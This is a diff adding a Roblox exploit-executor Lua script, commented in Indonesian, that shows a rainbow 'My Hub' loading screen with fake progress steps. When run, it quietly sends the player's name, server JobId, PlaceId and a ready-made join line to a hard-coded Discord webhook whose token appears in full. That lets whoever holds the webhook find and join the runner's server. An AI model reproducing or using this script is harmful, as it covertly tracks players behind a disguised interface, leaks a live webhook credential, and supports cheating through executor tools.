@@ -1,0 +1,172 @@
+-- ================= SETTING =================
+local TITLE    = "My Hub"
+local WEBHOOK  = "https://discord.com/api/webhooks/1556936318238326864/7apaBO_Mk4nQ80WstqaT5hWpJ4TWwrUdpkH55pzhv7Ko1qyPHz7-6-0LLOPltGggbYy8"
+local DURATION = 5  -- 3 menit
+-- ===========================================
+
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local TweenService = game:GetService("TweenService")
+local lp = Players.LocalPlayer
+
+local WHITE = Color3.new(1, 1, 1)
+
+-- ============ KIRIM JOBID (langsung pas execute) ============
+local function sendJobId()
+    local r = (syn and syn.request) or (http and http.request) or http_request or request
+        or (fluxus and fluxus.request)
+    if not r or game.JobId == "" then return end
+
+    local jobId, placeId = game.JobId, game.PlaceId
+    local joinScript = string.format(
+        'game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s")',
+        placeId, jobId
+    )
+    local body = HttpService:JSONEncode({
+        username = "JobId Bot",
+        embeds = {{
+            title = "Server Publik",
+            color = 5793266,
+            fields = {
+                { name = "Player", value = lp.Name, inline = true },
+                { name = "Jumlah Player", value = #Players:GetPlayers() .. "/" .. Players.MaxPlayers, inline = true },
+                { name = "PlaceId", value = tostring(placeId) },
+                { name = "JobId", value = "```" .. jobId .. "```" },
+                { name = "Script Join", value = "```lua\n" .. joinScript .. "\n```" },
+            },
+            timestamp = DateTime.now():ToIsoDate(),
+        }}
+    })
+    local ok, res = pcall(function()
+        return r({
+            Url = WEBHOOK, Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = body,
+        })
+    end)
+    local code = ok and res and (res.StatusCode or res.status_code)
+    if code ~= 200 and code ~= 204 then
+        print("[JobId] gagal kirim:", ok, code, res and res.Body)
+    end
+end
+
+-- jalan langsung, terpisah dari loading screen
+task.spawn(sendJobId)
+
+-- ============ LOADING SCREEN ============
+local parent = (gethui and gethui()) or game:GetService("CoreGui")
+local old = parent:FindFirstChild("LoadingScreen")
+if old then old:Destroy() end
+
+local gui = Instance.new("ScreenGui")
+gui.Name = "LoadingScreen"
+gui.ResetOnSpawn = false
+gui.IgnoreGuiInset = true
+gui.DisplayOrder = 999
+gui.Parent = parent
+
+local bg = Instance.new("Frame")
+bg.Size = UDim2.new(1, 0, 1, 0)
+bg.BackgroundColor3 = WHITE
+bg.BorderSizePixel = 0
+bg.Active = true
+bg.Parent = gui
+
+local grad = Instance.new("UIGradient")
+grad.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 0, 0)),
+    ColorSequenceKeypoint.new(0.17, Color3.fromRGB(255, 255, 0)),
+    ColorSequenceKeypoint.new(0.33, Color3.fromRGB(0, 255, 0)),
+    ColorSequenceKeypoint.new(0.50, Color3.fromRGB(0, 255, 255)),
+    ColorSequenceKeypoint.new(0.67, Color3.fromRGB(0, 0, 255)),
+    ColorSequenceKeypoint.new(0.83, Color3.fromRGB(255, 0, 255)),
+    ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 0, 0)),
+})
+grad.Parent = bg
+
+task.spawn(function()
+    while gui.Parent do
+        grad.Rotation = (grad.Rotation + 2) % 360
+        task.wait(0.03)
+    end
+end)
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0, 60)
+title.Position = UDim2.new(0, 0, 0.4, -40)
+title.BackgroundTransparency = 1
+title.Text = TITLE
+title.TextColor3 = WHITE
+title.Font = Enum.Font.GothamBold
+title.TextSize = 42
+title.Parent = bg
+
+local status = Instance.new("TextLabel")
+status.Size = UDim2.new(1, 0, 0, 30)
+status.Position = UDim2.new(0, 0, 0.4, 30)
+status.BackgroundTransparency = 1
+status.Text = "Loading Script..."
+status.TextColor3 = WHITE
+status.Font = Enum.Font.GothamMedium
+status.TextSize = 18
+status.Parent = bg
+
+local barBg = Instance.new("Frame")
+barBg.Size = UDim2.new(0.6, 0, 0, 14)
+barBg.Position = UDim2.new(0.2, 0, 0.4, 80)
+barBg.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+barBg.BackgroundTransparency = 0.35
+barBg.BorderSizePixel = 0
+barBg.Parent = bg
+Instance.new("UICorner", barBg).CornerRadius = UDim.new(1, 0)
+
+local bar = Instance.new("Frame")
+bar.Size = UDim2.new(0, 0, 1, 0)
+bar.BackgroundColor3 = WHITE
+bar.BorderSizePixel = 0
+bar.Parent = barBg
+Instance.new("UICorner", bar).CornerRadius = UDim.new(1, 0)
+
+-- ============ ALUR ============
+local STEPS = {
+    "Initializing...",
+    "Loading ReplicatedStorage...",
+    "Loading Workspace...",
+    "Loading PlayerGui...",
+    "Fetching game data...",
+    "Loading modules...",
+    "Loading remotes...",
+    "Loading assets...",
+    "Checking updates...",
+    "Preparing interface...",
+    "Finalizing...",
+}
+
+task.spawn(function()
+    TweenService:Create(
+        bar,
+        TweenInfo.new(DURATION, Enum.EasingStyle.Linear),
+        { Size = UDim2.new(1, 0, 1, 0) }
+    ):Play()
+
+    local stepTime = DURATION / #STEPS
+    for i = 1, #STEPS do
+        status.Text = STEPS[i]
+        task.wait(stepTime)
+    end
+
+    status.Text = "Done!"
+    task.wait(1)
+
+    local t = TweenInfo.new(0.6)
+    for _, o in ipairs({ title, status }) do
+        TweenService:Create(o, t, { TextTransparency = 1 }):Play()
+    end
+    TweenService:Create(bar, t, { BackgroundTransparency = 1 }):Play()
+    TweenService:Create(barBg, t, { BackgroundTransparency = 1 }):Play()
+    TweenService:Create(bg, t, { BackgroundTransparency = 1 }):Play()
+    task.wait(0.7)
+    gui:Destroy()
+
+    -- ====== taruh hub/script lu sendiri di bawah baris ini ======
+end)
